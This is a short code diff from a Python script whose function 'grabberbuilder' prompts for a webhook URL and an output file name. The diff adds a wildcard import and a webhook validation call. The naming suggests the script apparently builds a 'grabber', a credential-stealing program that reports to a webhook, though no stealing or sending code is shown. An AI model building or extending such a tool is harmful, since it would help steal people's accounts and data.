@@ -2,9 +2,11 @@ import os
 import subprocess
 import requests
 import sys
+from util.plugin.common import *
 
 def grabberbuilder():
     webhook = input(f'Webhook: ')
+    validateWebhook(webhook)
     name = input(f'File Name: ')
 
     # Create "output" folder if it doesn't exist
